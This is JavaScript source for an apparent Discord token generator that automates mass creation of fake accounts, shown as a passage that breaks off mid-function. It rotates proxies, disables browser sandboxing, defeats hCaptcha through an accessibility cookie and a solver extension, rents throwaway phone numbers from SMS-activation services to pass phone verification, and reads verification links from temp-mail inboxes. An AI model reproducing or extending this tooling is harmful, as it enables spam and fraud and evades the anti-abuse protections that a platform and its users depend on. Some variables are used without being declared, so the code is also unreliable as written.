let CURRENTVERSION = "1.4.3.0";
let fs = require("fs");
let axios = require("axios");
let public_thread;
let public_created;
let public_running = false;
let public_genlist;
let kReason;

async function delCookie() {
    try {
        fs.rmSync("./udd", { recursive: true });
    } catch {

    };
};

async function FUNCTION_DECRYPT(_text, _password) {
    return new Promise(async function (resolve) {
        const crypto = require("crypto");
        const algorithm = "aes-192-cbc";
        const key = crypto.scryptSync(_password, "GfG", 24);
        const iv = Buffer.alloc(16, 0);
        const decipher = crypto.createDecipheriv(algorithm, key, iv);
        let decrypted = "";
        let kReturn = false;

        decipher.on("readable", () => {
            if (kReturn == false) {
                kReturn = true;
            } else {
                return;
            };

            let chunk;

            while (null !== (chunk = decipher.read())) {
                decrypted += chunk.toString("utf8");
            };

            resolve(decrypted);
        });

        decipher.write(_text, "base64");
        decipher.end();
    });
};

let protectedD = false;

function FUNCTION_DELAY(_TIME) {
    return new Promise(resolve => setTimeout(resolve, _TIME));
};

class imLegend {
    constructor(thread) {
        public_running = true;
        public_thread = thread;
        public_created = 0;
        public_genlist = [];
    };

    async gen(_CONFIG, victim) {
        console.log("ppo");
        if (protectedD == false) {
            var config = {
                "msg": "fire",
                "icon": "success",
                "title": "Complete",
                "text": "Abnormal access detected!"
            };
            victim.send("msg", config);
        } else {
            console.log("ppo");
        };

        var tokenMustGen = _CONFIG["amount"];
        console.log("tokenMustGen: " + tokenMustGen);
        console.log("public_thread: " + public_thread);
        if (public_thread >= tokenMustGen) {
            for (var i = 0; i < tokenMustGen; i++) {
                var a = new imLegend2();
                a.FUNCTION_GENTOKEN_ALPHA(_CONFIG, 1, victim, i);
                public_genlist.push(a);
                console.log("run 1 thr");
            };
        } else {
            var result = parseInt(tokenMustGen / public_thread);
            var remainder = tokenMustGen % public_thread;
            for (var i = 0; i < public_thread; i++) {
                if (i == (tokenMustGen - 1)) {
                    var a = new imLegend2();
                    a.FUNCTION_GENTOKEN_ALPHA(_CONFIG, (result + remainder), victim, i);
                    public_genlist.push(a);
                } else {
                    var a = new imLegend2();
                    a.FUNCTION_GENTOKEN_ALPHA(_CONFIG, result, victim, i);
                    public_genlist.push(a);
                };
                console.log("run 1 thr");
            };
        };

        var holdProgress = true;
        while (holdProgress) {
            var falseAll = true;
            for (var i = 0; i < public_genlist.length; i++) {
                if (public_genlist[i].end == false) {
                    falseAll = false;
                };
            };
            if (falseAll == true) {
                if (public_running = true) {
                    public_running = false;

                    if (kReason != null) {
                        if (kReason == "warn") {
                            var config = {
                                "msg": "fire",
                                "icon": "success",
                                "title": "Complete",
                                "text": "Abnormal access detected!"
                            };
                            victim.send("msg", config);

                            var config2 = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : abnormal access detected"
                            };
                            victim.send("msg", config2);

                            kReason = null;

                            return;
                        };
                    };

                    var config = {
                        "msg": "fire",
                        "icon": "success",
                        "title": "Complete",
                        "text": "Generating " + tokenMustGen + " token is finished!"
                    };
                    victim.send("msg", config);

                    var config2 = {
                        "msg": "weblog",
                        "type": "genmsg",
                        "text": "Log : gen finished"
                    };
                    victim.send("msg", config2);

                    return;
                } else {
                    if (kReason != null) {
                        if (kReason == "warn") {
                            var config = {
                                "msg": "fire",
                                "icon": "success",
                                "title": "Complete",
                                "text": "Abnormal access detected!"
                            };
                            victim.send("msg", config);

                            var config2 = {
                                "msg": "weblog",
                                "type": "genmsg",
                                "text": "Log : abnormal access detected"
                            };
                            victim.send("msg", config2);

                            kReason = null;

                            return;
                        };
                    };

                    var config = {
                        "msg": "fire",
                        "icon": "warning",
                        "title": "Warning",
                        "text": "Token generation was forcibly terminated!"
                    };
                    victim.send("msg", config);

                    var config2 = {
                        "msg": "weblog",
                        "type": "genmsg",
                        "text": "Log : gen force stop"
                    };
                    victim.send("msg", config2);

                    return;
                };
            };
            await FUNCTION_DELAY(1000);
        };
    };
};

class imLegend2 {
    constructor() {
        this.end = false;
        this.created = 0;
    };

    async FUNCTION_GENTOKEN_ALPHA(_CONFIG, _AMOUNT, victim, meCount) {
        const FUNCTION_START = async () => {

            const FUNCTION_START_GEN = async () => {
                console.log("startgen function call");

                await delCookie();

                if (public_genlist[meCount].created == tokenMustGen) {
                    try { await browser.close(); } catch { };
                    public_genlist[meCount].end = true;
                    return;
                };
                if (public_running == false) {
                    try { await browser.close(); } catch { };
                    public_genlist[meCount].end = true;
                    return;
                };

                var config = {
                    "msg": "weblog",
                    "type": "genmsg",
                    "text": "Log : gen " + (public_created + 1)
                };
                victim.send("msg", config);

                if (VALUE_TRY_LIST_COOL[VALUE_TRY_COUNT - 1] != 0 && proxyGen == false) {
                    const delaySec = VALUE_TRY_LIST_COOL[VALUE_TRY_COUNT - 1] * 1000;
                    VALUE_TRY_LIST_COOL[VALUE_TRY_COUNT - 1] = false;

                    console.log("gen delay " + delaySec + "ms");

                    var config = {
                        "msg": "weblog",
                        "type": "genmsg",
                        "text": "Log : gen delay " + (delaySec / 1000) + "sec start"
                    };
                    victim.send("msg", config);

                    await FUNCTION_DELAY(delaySec);

                    console.log("gen delay end");

                    var config2 = {
                        "msg": "weblog",
                        "type": "genmsg",
                        "text": "Log : gen delay finished"
                    };
                    victim.send("msg", config2);
                };

                if (customNick) {
                    if (customType == "custom") {
                        _USERNAME = customVal;
                    } else {
                        var nn = await fs.readFileSync(customVal, "utf8");
                        nn = nn.split("\n");
                        if (public_created > nn.length) {
                            _USERNAME = await FUNCTION_GET_NICKNAME();
                        } else {
                            _USERNAME = nn[public_created];
                        };
                    };
                } else {
                    _USERNAME = await FUNCTION_GET_NICKNAME();
                };

                _PASSWORD = await FUNCTION_MAKEHASH(11);

                _TOKEN = false;

                try {
                    if (moduleT == "1") {
                        const args = [
                            "--no-sandbox",
                            "--remote-debugging-port=9222",
                            "--disable-setuid-sandbox",
                            "--ignore-certificate-errors",
                            "--disk-cache-size=1",
                            "--window-size=1600,900",
                            "--disable-infobars"
                        ];

                        const o = await tmp.dir({
                            unsafeCleanup: true,
                        });

                        const userDataDir = o.path;

                        let brConfig = {
                            headless: headless,
                            bypassCSP: true,
                            ignoreHTTPSErrors: true,
                            args: args,
                            timezoneId: "America/Los_Angeles"
                        };

                        if (proxyGen == true) {
                            _PROXY = await fs.readFileSync(proxyDir, "utf8");
                            _PROXY = _PROXY.split("\n")[Math.floor(Math.random() * _PROXY.split("\n").length)];
                            console.log("PROXY : " + _PROXY);
                            if (proxyUser == "1") {
                                brConfig["proxy"] = {
                                    server: _PROXY
                                };
                            } else if (proxyUser == "2") {
                                brConfig["proxy"] = {
                                    server: _PROXY.split("@")[1]
                                };
                            };

                            brConfig["proxy"] = {
                                server: _PROXY
                            };
                        };

                        console.log(brConfig);

                        if (browserT == "1") {
                            browser = await browserList["plChromium"].launchPersistentContext(userDataDir, brConfig);
                        } else if (browserT == "2") {
                            browser = await browserList["plFirefox"].launchPersistentContext(userDataDir, brConfig);
                        } else if (browserT == "3") {
                            browser = await browserList["plWebkit"].launchPersistentContext(userDataDir, brConfig);
                        };

                        MainPage = await browser.newPage();

                    } else if (moduleT == "2") {
                        var dirBrowser = browserList["ppChromium"].executablePath();
                        if (dirBrowser.includes("app.asar")) {
                            dirBrowser = dirBrowser.replace("app.asar", "app.asar.unpacked");
                        };

                        let brConfig = {
                            args: [
                                "--no-sandbox",
                                "--disable-setuid-sandbox",
                                "--disable-infobars",
                                "--window-position=0,0",
                                "--window-size=1600,900"
                            ],
                            defaultViewport: null,
                            ignoreHTTPSErrors: true,
                            headless: headless,
                            executablePath: dirBrowser
                        };

                        if (configCatpcha.module == "CAPTCHA_IMAGE") {
                            var dirExtension = dirBrowser.substring(0, dirBrowser.length - 11) + "/extensionCaptcaSolver/";
                            console.log(dirExtension);
                            brConfig["args"].push("--disable-extensions-except=" + dirExtension);
                            brConfig["args"].push("--load-extension=" + dirExtension);
                        };

                        if (proxyGen == true) {
                            _PROXY = await fs.readFileSync(proxyDir, "utf8");
                            _PROXY = _PROXY.split("\n")[Math.floor(Math.random() * _PROXY.split("\n").length)];
                            console.log("PROXY : " + _PROXY);
                            if (proxyUser == "1") {
                                brConfig["args"].push("--proxy-server=" + _PROXY);
                            } else if (proxyUser == "2") {
                                brConfig["args"].push("--proxy-server=" + _PROXY.split("@")[1]);
                            };

                            brConfig["proxy"] = {
                                server: _PROXY
                            };
                        };

                        if (browserT == "1") {
                            browser = await browserList["ppChromium"].launch(brConfig);

                            var pageList;
                            var holdProgress = true;

                            while (holdProgress) {
                                pageList = await browser.pages();
                                if (pageList.length == 1) {
                                    holdProgress = false;
                                    break;
                                };
                                await FUNCTION_DELAY(500);
                            };

                            //await pageList[0].close();
                            //await pageList[1].close();
                            MainPage = await browser.newPage();
                            //await pageList[2].close();
                            await pageList[0].close();

                            try {
                                PuppeteerBlocker.fromPrebuiltAdsAndTracking(fetch).then((blocker) => {
                                    blocker.enableBlockingInPage(MainPage);
                                });
                            } catch (e) {
                                console.log("adblock plugin fail ->");
                                console.log(e);
                            };
                            //await pageList[1].close();
                        };
                    };
                } catch (e) {
                    console.log(e);

                    try { await browser.close(); } catch { };

                    var config = {
                        "msg": "weblog",
                        "type": "generror",
                        "text": "Error : lunch browser with proxy<br>" + e
                    };
                    victim.send("msg", config);

                    await FUNCTION_DELAY(1000);
                    FUNCTION_START_GEN();

                    return;
                };

                console.log("browser launched");

                await FUNCTION_DELAY(1000);

                if (configCatpcha.use == true && configCatpcha.module == "CAPTCHA_COOKIE") {
                    try {
                        await MainPage.goto("https://dashboard.hcaptcha.com/");

                        await FUNCTION_DELAY(550);

                        await MainPage.setCookie({
                            name: "hc_accessibility",
                            value: configCatpcha.key,
                            domain: ".hcaptcha.com",
                            path: "/",
                            secure: true,
                            sameSite: "None"
                        });

                        console.log("setting hcaptcha success");

                        var config2 = {
                            "msg": "weblog",
                            "type": "genmsg",
                            "text": "Log : setting hcaptcha success"
                        };
                        victim.send("msg", config2);
                    } catch (e) {
                        console.log("hcaptcha set error ->");
                        console.log(e);

                        var config = {
                            "msg": "weblog",
                            "type": "generror",
                            "text": "Error : setting hcaptcha<br>" + e
                        };
                        victim.send("msg", config);
                    };
                };

                FUNCTION_REGISTER();
            };

            async function FUNCTION_MAKEHASH(size) {
                return Array.apply(0, Array(size)).map(function () {
                    return (function (charset) {
                        return charset.charAt(Math.floor(Math.random() * charset.length));
                    })("abcdefghijklmnopqrstuvwxyz1234567890");
                }).join("");
            };

            function FUNCTION_GET_NICKNAME() {
                let nick = randomname();
                return nick;
            };

            function FUNCTION_VERIFY_PHONE() {
                return new Promise(async function (resolve) {
                    var retry = false;
                    var smsinfo;
                    var orderRequest;
                    async function quai() {
                        console.log("verifying phone");

                        var config = {
                            "msg": "weblog",
                            "type": "genmsg",
                            "text": "Log : verifying phone"
                        };
                        victim.send("msg", config);

                        await FUNCTION_DELAY(1100);

                        await MainPage.goto("https://discord.com/app", { "waitUntil": pageWaitValue });

                        await FUNCTION_DELAY(2300);

                        console.log("kakashi: " + _TOKEN);

                        var clickVerify = true;

                        var kakashi = 0;

                        while (clickVerify) {

                            try {
                                var cmd = `document.getElementsByClassName("colorBrand-I6CyqQ")[5].click();`;
                                await MainPage.evaluate(cmd);
                                clickVerify = false;
                                break;
                            } catch {
                                kakashi++;

                                if (kakashi > 40) {
                                    resolve("true:Generated email verify token");
                                    return;
                                    // var cmd2 = `document.getElementsByClassName("colorBrand-I6CyqQ")[2].click();`;
                                    // await MainPage.evaluate(cmd2);
                                    // await FUNCTION_DELAY(1000);
                                    // var cmd3 = `document.getElementsByClassName("lookFilled-yCfaCM colorGrey-2iAG-B")[2].click();`;
                                    // await MainPage.evaluate(cmd3);
                                    // break;
                                };
                            };
                            await FUNCTION_DELAY(500);
                        };

                        try {

                            console.log("verifying phone 2");

                            await MainPage.waitForSelector("button.countryButton-1cNDvB", { timeout: 2000 });
                            await FUNCTION_DELAY(1000);
                            await MainPage.click("button.countryButton-1cNDvB");

                            console.log("verifying phone 3");

                            try {
                                await MainPage.waitForSelector("input.input-2m5SfJ", { timeout: 2000 });
                            } catch {
                                try {
                                    await MainPage.click("button.countryButton-1cNDvB");

                                    console.log("verifying phone 3");

                                    await MainPage.waitForSelector("input.input-2m5SfJ", { timeout: 2000 });
                                } catch {
                                    console.log("SMS Error (Elemened not found)");
                                    var config = {
                                        "msg": "weblog",
                                        "type": "generror",
                                        "text": "Error : SMS Error (Elemened not found)"
                                    };
                                    victim.send("msg", config);
                                    resolve("false:SMS Error (Elemened not found)");
                                    return;
                                };
                            };

                            async function FUNCTION_SMS_ORDER_ROOP() {
                                if (retry == false) {
                                    var random;
                                    random = Math.floor(Math.random() * smsConfigList.length);
                                    smsinfo = smsConfigList[random];
                                    console.log("[PROCESS RUNNING] SMS VERIFY | USING CONFIG ->");
                                    console.log(smsinfo);
                                    if (smsType == "SMS_ACTIVATE_ORG") {
                                        console.log("[PROCESS RUNNING] SMS VERIFY | REQUESTING SMS ACTIVATE ORG");

                                        try {
                                            orderRequest = await axios({
                                                url: "https://api.sms-activate.org/stubs/handler_api.php?api_key=" + smsKey + "&action=getNumber&service=ds&country=" + smsinfo.offerCode + "&operator=" + smsinfo.operator,
                                                method: "post"
                                            });
                                        } catch {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | NETWORK ERROR (SMS-ACTIVATE.ORG REQUEST)");
                                            await FUNCTION_DELAY(500);
                                            FUNCTION_SMS_ORDER_ROOP();
                                            return;
                                        };

                                        if (orderRequest.data.includes(":")) {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | NUMBER REQUEST SUCCESS ->");
                                            console.log(orderRequest.data);
                                        } else {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | NUMBER REQUEST FAIL ->");
                                            console.log(orderRequest.data);
                                            await FUNCTION_DELAY(500);
                                            FUNCTION_SMS_ORDER_ROOP();
                                            return;
                                        };
                                    } else if (smsType == "SMS_5SIM") {
                                        console.log("[PROCESS RUNNING] SMS VERIFY | REQUESTING 5SIM");

                                        var headers = {
                                            "Authorization": "Bearer " + smsKey,
                                            "Accept": "application/json"
                                        };

                                        try {
                                            orderRequest = await axios.get("https://5sim.net/v1/user/buy/activation/" + smsinfo["countryS"] + "/mts/discord", { headers: headers });
                                        } catch {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | NETWORK ERROR (5SIM REQUEST)");
                                            await FUNCTION_DELAY(500);
                                            FUNCTION_SMS_ORDER_ROOP();
                                            return;
                                        };

                                        if (orderRequest.data.id) {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | NUMBER REQUEST SUCCESS ->");
                                            console.log(orderRequest.data);
                                        } else {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | NUMBER REQUEST FAIL ->");
                                            console.log(orderRequest.data);
                                            await FUNCTION_DELAY(500);
                                            FUNCTION_SMS_ORDER_ROOP();
                                            return;
                                        };
                                    } else {
                                        console.log("[PROCESS RUNNING] SMS VERIFY | UNKNOWN SMS TYPE");
                                        await FUNCTION_DELAY(500);
                                        FUNCTION_SMS_ORDER_ROOP();
                                        return;
                                    };
                                };

                                console.log("[PROCESS RUNNING] SMS VERIFY | FINAL SMS CONFIG INFO ->");
                                console.log(smsinfo);
                                await MainPage.type("input.input-2m5SfJ", smsinfo.country + "");
                                await FUNCTION_DELAY(220);
                                var cmd = `document.getElementsByClassName("horizontal-112GEH")[6].click();`;
                                await MainPage.evaluate(cmd);
                                var NUMB;
                                if (smsType == "SMS_ACTIVATE_ORG") {
                                    NUMB = (orderRequest.data.split(":")[2]).substr(smsinfo.subLength);
                                } else if (smsType == "SMS_5SIM") {
                                    NUMB = orderRequest.data.phone.substr(smsinfo.subLength + 1);
                                };

                                await MainPage.type("input.inputField-1iYysB", NUMB);

                                await MainPage.click("button.sendButton-3xHNhl");

                                const bypassVal = await FUNCTION_BYPASS_CAPTCHA(MainPage, true, true);

                                if (bypassVal == "false:captcha not bypassed") {
                                    console.log("SMS Error (Will not receive)");
                                    var config = {
                                        "msg": "weblog",
                                        "type": "generror",
                                        "text": "Error : SMS Error (Will not receive)"
                                    };
                                    victim.send("msg", config);
                                    resolve("false:SMS Error (Will not receive)");
                                    return;
                                };

                                console.log("[PROCESS RUNNING] SMS VERIFY | CODE SEND CAPTCHA VALUE -> " + bypassVal);

                                if (bypassVal.split(":")[0] == "true") {
                                    console.log(bypassVal.split(":")[1]);
                                    var config = {
                                        "msg": "weblog",
                                        "type": "genmsg",
                                        "text": "Log : " + bypassVal.split(":")[1]
                                    };
                                    victim.send("msg", config);
                                } else {
                                    console.log(bypassVal.split(":")[1]);
                                    resolve("false:" + bypassVal.split(":")[1]);
                                    return;
                                };

                                try {
                                    await MainPage.waitForSelector("input.input-3NIgDw");
                                } catch (e) {
                                    console.log("get number input element error ->");
                                    console.log(e);
                                    var code = await FUNCTION_MAKEHASH(5);
                                    await MainPage.screenshot({ path: code + ".png", fullPage: true });
                                    resolve("false:SMS Verify (Screenshot to ./" + code + ".png)");
                                    return;
                                };

                                console.log("[PROCESS RUNNING] SMS VERIFY | CODE RECEIVE READY");

                                var getCodeLoop = 0;
                                var resendCode = false;
                                var smsResult;

                                async function FUNCTION_SMS_ROOP() {
                                    if (smsType == "SMS_ACTIVATE_ORG") {
                                        try {
                                            smsResult = await axios({
                                                url: "https://api.sms-activate.org/stubs/handler_api.php?api_key=" + smsKey + "&action=getStatus&id=" + orderRequest.data.split(":")[1],
                                                method: "get"
                                            });
                                        } catch {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | NETWORK ERROR (SMS-ACTIVATE.ORG REQUEST)");
                                            await FUNCTION_DELAY(500);
                                            FUNCTION_SMS_ORDER_ROOP();
                                            return;
                                        };
                                        if (smsResult.data.includes("STATUS_OK")) {
                                            console.log("success[2] -> " + smsResult.data);
                                        } else {
                                            if (resendCode) {
                                                if (getCodeLoop == 60) {
                                                    console.log("SMS code not received");
                                                    if (retry == true) {
                                                        var config = {
                                                            "msg": "weblog",
                                                            "type": "generror",
                                                            "text": "Error : SMS code not received"
                                                        };
                                                        victim.send("msg", config);
                                                        resolve("false:SMS Code not received");
                                                        return;
                                                    } else {
                                                        console.log("retrying");
                                                        retry = true;
                                                        quai();
                                                        return;
                                                    };
                                                } else {
                                                    getCodeLoop++;
                                                    console.log("[PROCESS RUNNING] SMS VERIFY | NO CODE RECEIVED ->");
                                                    console.log(smsResult.data);
                                                    await FUNCTION_DELAY(500);
                                                    FUNCTION_SMS_ROOP();
                                                    return;
                                                };
                                            } else {
                                                if (getCodeLoop == 60) {
                                                    var cmd = `document.getElementsByClassName("marginTop8-24uXGp")[1]`;
                                                    await MainPage.evaluate(cmd);
                                                    getCodeLoop = 0;
                                                    resendCode = true;
                                                };
                                                getCodeLoop++;
                                                console.log("[PROCESS RUNNING] SMS VERIFY | NO CODE RECEIVED ->");
                                                console.log(smsResult.data);
                                                await FUNCTION_DELAY(500);
                                                FUNCTION_SMS_ROOP();
                                                return;
                                            };
                                        };
                                    } else if (smsType == "SMS_5SIM") {
                                        var headers = {
                                            "Authorization": "Bearer " + smsKey,
                                            "Accept": "application/json"
                                        };
                                        try {
                                            smsResult = await axios.get("https://5sim.net/v1/user/check/" + orderRequest.data.id, { headers: headers });
                                        } catch {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | NETWORK ERROR (5SIM REQUEST)");
                                            await FUNCTION_DELAY(500);
                                            FUNCTION_SMS_ORDER_ROOP();
                                            return;
                                        };
                                        if (smsResult.data.sms.length == 1) {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | CODE RECEIVED ->");
                                            console.log(smsResult.data);
                                        } else {
                                            if (resendCode) {
                                                if (getCodeLoop == 60) {
                                                    if (retry == true) {
                                                        console.log("[PROCESS RUNNING] SMS VERIFY | CODE NOT RECEIVED (FINAL)");
                                                        var config = {
                                                            "msg": "weblog",
                                                            "type": "generror",
                                                            "text": "Error : SMS code not received"
                                                        };
                                                        victim.send("msg", config);
                                                        resolve("false:SMS Code not received");
                                                        return;
                                                    } else {
                                                        console.log("[PROCESS RUNNING] SMS VERIFY | CODE NOT RECEIVED (PRIMARY)");
                                                        console.log("[PROCESS RUNNING] SMS VERIFY | RETRYING");
                                                        retry = true;
                                                        quai();
                                                        return;
                                                    };
                                                } else {
                                                    getCodeLoop++;
                                                    console.log("fail[2] -> ");
                                                    console.log(smsResult.data);
                                                    await FUNCTION_DELAY(500);
                                                    FUNCTION_SMS_ROOP();
                                                    return;
                                                };
                                            } else {
                                                if (getCodeLoop == 60) {
                                                    var cmd = `document.getElementsByClassName("marginTop8-24uXGp")[1]`;
                                                    await MainPage.evaluate(cmd);
                                                    getCodeLoop = 0;
                                                    resendCode = true;
                                                };
                                                getCodeLoop++;
                                                console.log("[PROCESS RUNNING] SMS VERIFY | CODE RECEIVED ->");
                                                console.log(smsResult.data);
                                                await FUNCTION_DELAY(500);
                                                FUNCTION_SMS_ROOP();
                                                return;
                                            };
                                        };
                                    };
                                    if (smsType == "SMS_ACTIVATE_ORG") {
                                        console.log("[PROCESS RUNNING] SMS VERIFY | CODE RECEIVED ->");
                                        console.log(smsResult.data);
                                        try {
                                            await MainPage.keyboard.press("Tab");
                                            await FUNCTION_DELAY(200);
                                            await MainPage.keyboard.type(smsResult.data.split(":")[1].slice(0, -5));
                                            await MainPage.keyboard.type(smsResult.data.split(":")[1].substr(1).slice(0, -4));
                                            await MainPage.keyboard.type(smsResult.data.split(":")[1].substr(2).slice(0, -3));
                                            await MainPage.keyboard.type(smsResult.data.split(":")[1].substr(3).slice(0, -2));
                                            await MainPage.keyboard.type(smsResult.data.split(":")[1].substr(4).slice(0, -1));
                                            await MainPage.keyboard.type(smsResult.data.split(":")[1].substr(5));
                                        } catch (e) {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | SMS CODE ENTER ERROR ->");
                                            console.log(e);
                                            var code = await FUNCTION_MAKEHASH(5);
                                            await MainPage.screenshot({ path: code + ".png", fullPage: true });
                                            resolve("false:SMS Verify (Screenshot to ./" + code + ".png)");
                                            return;
                                        };
                                    } else if (smsType == "SMS_5SIM") {
                                        console.log("[PROCESS RUNNING] SMS VERIFY | CODE RECEIVED ->");
                                        console.log(smsResult.data);
                                        try {
                                            await MainPage.keyboard.press("Tab");
                                            await FUNCTION_DELAY(200);
                                            await MainPage.keyboard.type(smsResult.data.sms[0].code.slice(0, -5));
                                            await MainPage.keyboard.type(smsResult.data.sms[0].code.substr(1).slice(0, -4));
                                            await MainPage.keyboard.type(smsResult.data.sms[0].code.substr(2).slice(0, -3));
                                            await MainPage.keyboard.type(smsResult.data.sms[0].code.substr(3).slice(0, -2));
                                            await MainPage.keyboard.type(smsResult.data.sms[0].code.substr(4).slice(0, -1));
                                            await MainPage.keyboard.type(smsResult.data.sms[0].code.substr(5));
                                        } catch (e) {
                                            console.log("[PROCESS RUNNING] SMS VERIFY | SMS CODE ENTER ERROR ->");
                                            console.log(e);
                                            var code = await FUNCTION_MAKEHASH(5);
                                            await MainPage.screenshot({ path: code + ".png", fullPage: true });
                                            resolve("false:SMS Verify (Screenshot to ./" + code + ".png)");
                                            return;
                                        };
                                    };
                                    await FUNCTION_DELAY(1000);
                                    try {
                                        await MainPage.waitForSelector("input[type='password']");
                                        await MainPage.type("input[type='password']", _PASSWORD + "\n");
                                        console.log("[PROCESS RUNNING] SMS VERIFY | SUCCESS");
                                        resolve("true:SMS Verify Success");
                                        return;
                                    } catch (e) {
                                        console.log("[PROCESS RUNNING] SMS VERIFY | PASSWORD ENTER ERROR ->");
                                        console.log(e);
                                        var code = await FUNCTION_MAKEHASH(5);
                                        await MainPage.screenshot({ path: code + ".png", fullPage: true });
                                        resolve("false:SMS Verify (Screenshot to ./" + code + ".png)");
                                        return;
                                    };
                                };
                                FUNCTION_SMS_ROOP();
                            };
                            FUNCTION_SMS_ORDER_ROOP();
                        } catch (e) {
                            console.log("sms verify -> unknown error");
                            console.log(e);
                            var code = await FUNCTION_MAKEHASH(5);
                            await MainPage.screenshot({ path: code + ".png", fullPage: true });
                            resolve("false:SMS Verify (Screenshot to ./" + code + ".png)");
                            return;
                        };
                    };
                    quai();
                });
            };

            async function FUNCTION_MAIL_REMOVE() {
                if (mailserver == "1") {
                    try { await MAIL_MODULE.deleteMe(); } catch (e) { };
                } else if (mailserver == "2") {
                    //try { await MAIL_MODULE.deleteMeGW(); } catch (e) { };
                };
            };

            function FUNCTION_STOP_VERIFY_EMAIL() {
                async function d() {
                    verifyObj[_EMAIL] = true;
                    await FUNCTION_DELAY(180000);
                    verifyObj[_EMAIL] = false;
                };
                d();
            };

            function FUNCTION_VERIFY_EMAIL() {
                return new Promise(async function (resolve) {
                    FUNCTION_STOP_VERIFY_EMAIL();
                    var emailData;
                    var captchaPage;
                    var cc = true;
                    try {
                        console.log("[PROCESS RUNNING] EMAIL VERIFY | REQUEST START");

                        var config = {
                            "msg": "weblog",
                            "type": "genmsg",
                            "text": "Log : starting to request email..."
                        };
                        victim.send("msg", config);

                        if (mailserver == "4") {
                            await MailPage.bringToFront();
                        };

                        while (cc) {
                            try {
                                if (verifyObj[_EMAIL]) {
                                    if (mailserver == "1") {
                                        var Messages = await MAIL_MODULE.getMessages();
                                        if (Messages.data.length != 0) {
                                            for (var i = 0; i < Messages.data.length; i++) {
                                                console.log("[PROCESS RUNNING] EMAIL VERIFY | VERIFY MAIL RECEIVED (" + _EMAIL + ")");

                                                var config = {
                                                    "msg": "weblog",
                                                    "type": "genmsg",
                                                    "text": "Log : discord mail received!"
                                                };
                                                victim.send("msg", config);

                                                emailData = await MAIL_MODULE.getSource(Messages.data[i].id);

                                                cc = false;
                                                break;
                                            };
                                        };
                                    } else if (mailserver == "2") {
                                        try {
                                            var cmd = `document.getElementsByClassName("leading-5")[13].click();`;
                                            var holdProgress = true;

                                            while (holdProgress) {
                                                try {
                                                    await MailPage.evaluate(cmd);
                                                    holdProgress = false;
                                                    break;
                                                } catch {

                                                };
                                            };

                                            await MailPage.waitForSelector("[title*=Discord]", { timeout: 5000 });
                                            await FUNCTION_DELAY(1000);

                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | VERIFY MAIL RECEIVED (" + _EMAIL + ")");

                                            var config = {
                                                "msg": "weblog",
                                                "type": "genmsg",
                                                "text": "Log : email recevied | " + _EMAIL
                                            };
                                            victim.send("msg", config);

                                            await MailPage.click("[title*=Discord]");

                                            await MailPage.waitForSelector("a[href*='discord'][style*=background]", { timeout: 5000 });

                                            await FUNCTION_DELAY(1000);

                                            var pageList;
                                            var holdProgress2 = true;
                                            var bypassVal;

                                            while (holdProgress2) {
                                                pageList = await browser.pages();
                                                if (smsGen) {
                                                    if (pageList.length == 3) {
                                                        await pageList[1].close();
                                                        captchaPage = pageList[2];
                                                        holdProgress2 = false;
                                                        break;
                                                    } else {
                                                        await MailPage.click("td > a[href*='discord'][style*=background]");
                                                    };
                                                } else {
                                                    if (pageList.length == 2) {
                                                        await pageList[0].close();
                                                        captchaPage = pageList[1];
                                                        holdProgress2 = false;
                                                        break;
                                                    } else {
                                                        await MailPage.click("td > a[href*='discord'][style*=background]");
                                                    };
                                                };
                                                await FUNCTION_DELAY(880);
                                            };

                                            cc = false;
                                            break;
                                        } catch (e) {

                                        };
                                    } else if (mailserver == "3") {
                                        var axiosData = await axios.get("https://api.internal.temp-mail.io/api/v3/email/" + _EMAIL + "/messages").then(res => res.data);
                                        if (axiosData.length !== 0) {
                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | VERIFY MAIL RECEIVED (" + _EMAIL + ")");

                                            var config = {
                                                "msg": "weblog",
                                                "type": "genmsg",
                                                "text": "Log : discord mail received!"
                                            };
                                            victim.send("msg", config);

                                            emailData = axiosData;

                                            cc = false;
                                            break;
                                        };
                                    } else if (mailserver == "4") {
                                        //await MailPage.mouse.wheel({ deltaY: (Math.random() - 0.5) * 200 });
                                        try {
                                            try {
                                                await MailPage.waitForSelector("[title*=Discord]", { timeout: 5000 });
                                            } catch {
                                                await FUNCTION_DELAY(2000);

                                                await MailPage.waitForSelector("a[href*='discord'][style*=background]", { timeout: 5000 });

                                                await FUNCTION_DELAY(1000);

                                                var holdProgress2 = true;
                                                while (holdProgress2) {
                                                    try {
                                                        if (smsGen) {
                                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | MAILPAGE LENGTH CATCH LOOP (SMS)");
                                                            pageList = await browser.pages();
                                                            if (pageList.length == 3) {
                                                                console.log("[PROCESS RUNNING] EMAIL VERIFY | CLOSING MAILPAGE (SMS)");
                                                                await pageList[1].close();
                                                                captchaPage = pageList[2];
                                                                holdProgress2 = false;
                                                                break;
                                                            } else {
                                                                console.log("[PROCESS RUNNING] EMAIL VERIFY | CLICKING VERIFY LINK (SMS) (" + pageList.length + ")");
                                                                await MailPage.click("td > a[href*='discord'][style*=background]");
                                                            };
                                                        } else {
                                                            console.log("[PROCESS RUNNING] EMAIL VERIFY | MAILPAGE LENGTH CATCH LOOP (NO SMS)");
                                                            pageList = await browser.pages();
                                                            if (pageList.length == 2) {
                                                                console.log("[PROCESS RUNNING] EMAIL VERIFY | CLOSING MAILPAGE (NO SMS)");
                                                                await pageList[0].close();
                                                                captchaPage = pageList[1];
                                                                holdProgress2 = false;
                                                                break;
                                                            } else {
                                                                console.log("[PROCESS RUNNING] EMAIL VERIFY | CLICKING VERIFY LINK (NO SMS)");
                                                                await MailPage.click("td > a[href*='discord'][style*=background]");
                                                            };
                                                        };
                                                        await FUNCTION_DELAY(1500);
                                                    } catch (e) {
                                                        console.log("[PROCESS RUNNING] EMAIL VERIFY | UNKNOWN ERROR OCCURRED (PAGE CATCH) ->");
                                                        console.log(e);
                                                    };
                                                };

                                                cc = false;
                                                break;
                                            };

                                            await FUNCTION_DELAY(1000);

